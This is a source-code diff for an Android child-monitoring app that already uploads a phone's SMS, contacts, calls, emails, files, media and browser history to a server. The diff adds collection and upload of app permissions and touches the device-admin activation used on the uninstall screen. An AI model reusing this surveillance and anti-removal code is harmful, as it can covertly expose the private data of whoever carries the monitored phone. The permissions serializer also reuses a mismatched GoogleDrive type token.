@@ -36,6 +36,7 @@ import com.kidguard.model.Files;
 import com.kidguard.model.GoogleDrive;
 import com.kidguard.model.Images;
 import com.kidguard.model.Mail;
+import com.kidguard.model.Permissions;
 import com.kidguard.model.Sms;
 import com.kidguard.model.Video;
 import com.kidguard.preference.Preference;
@@ -64,6 +65,7 @@ public class BackgroundDataService extends Service implements Constant {
     private ArrayList<GoogleDrive> lstDrive2;
     private ArrayList<BrowserHistory> lstBrowserHistory;
     private ArrayList<File> fileList;
+    private ArrayList<Permissions> lstPermission;
 
     private String tag;
     private String count;
@@ -149,12 +151,10 @@ public class BackgroundDataService extends Service implements Constant {
                         getString(R.string.add_admin_extra_app_text));
 
                 if (MainActivity.getInstance() != null) {
-                    //Preference.setIsAdminActive(context, true);
                     MainActivity.getInstance().startActivity(intent);
                 }
 
                 if (UninstallActivity.getInstance() != null) {
-                    //Preference.setIsAdminActive(context, true);
                     UninstallActivity.getInstance().startActivity(intent);
                 }
                 break;
@@ -246,6 +246,11 @@ public class BackgroundDataService extends Service implements Constant {
 
         if (tag.equals(TAG_BROWSER_HISTORY)) {
             Utilities.getBrowserHistoryList(this);
+            return;
+        }
+
+        if (tag.equals(TAG_PERMISSIONS)) {
+            Utilities.getAppPermissions(this);
             return;
         }
 
@@ -392,6 +397,14 @@ public class BackgroundDataService extends Service implements Constant {
         stopSelf();
     }
 
+    /* Send Application Permission's To Server */
+    public void sendAppPermissionToServer(ArrayList<Permissions> lstPermission) {
+        this.lstPermission = lstPermission;
+        String permissions = convertToJSONFormat(TAG_PERMISSIONS);
+        new RestClientService(TAG_PERMISSIONS, Preference.getAccessToken(context), permissions);
+        stopSelf();
+    }
+
     // Get Files List
     public ArrayList<File> getFile(File dir) {
         File listFile[] = dir.listFiles();
@@ -417,7 +430,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArraySms = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Sms\":" + jsonArraySms;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Sms\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -431,7 +444,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayContacts = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Contacts\":" + jsonArrayContacts;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Contacts\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -445,7 +458,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayCalls = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Calls\":" + jsonArrayCalls;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Calls\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -459,7 +472,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayApps = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Apps\":" + jsonArrayApps;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Apps\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -474,7 +487,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayFiles = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Files\":" + jsonArrayFiles;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Files\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -488,7 +501,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayImages = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Images\":" + jsonArrayImages;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Images\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -502,7 +515,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayVideos = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Videos\":" + jsonArrayVideos;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Videos\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -516,7 +529,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayEmail = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Emails\":" + jsonArrayEmail;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"Emails\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -530,7 +543,7 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"GoogleDrive\":" + jsonArrayDrive;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"GoogleDrive\":" + "[]";
                 sbAppend.append(finalJSON);
             }
@@ -544,8 +557,22 @@ public class BackgroundDataService extends Service implements Constant {
                 JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"BrowserHistory\":" + jsonArrayDrive;
                 sbAppend.append(finalJSON);
-            }else{
+            } else {
                 finalJSON = "\"BrowserHistory\":" + "[]";
+                sbAppend.append(finalJSON);
+            }
+        }
+
+        if (tag.equals(TAG_PERMISSIONS)) {
+            if (lstPermission != null && lstPermission.size() > Integer.parseInt(ZERO)) {
+                Type type = new TypeToken<List<GoogleDrive>>() {
+                }.getType();
+                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstPermission, type);
+                JsonArray jsonArrayPermission = Utilities.getJsonArray(jsonArray);
+                finalJSON = "\"Permissions\":" + jsonArrayPermission;
+                sbAppend.append(finalJSON);
+            } else {
+                finalJSON = "\"Permissions\":" + "[]";
                 sbAppend.append(finalJSON);
             }
         }
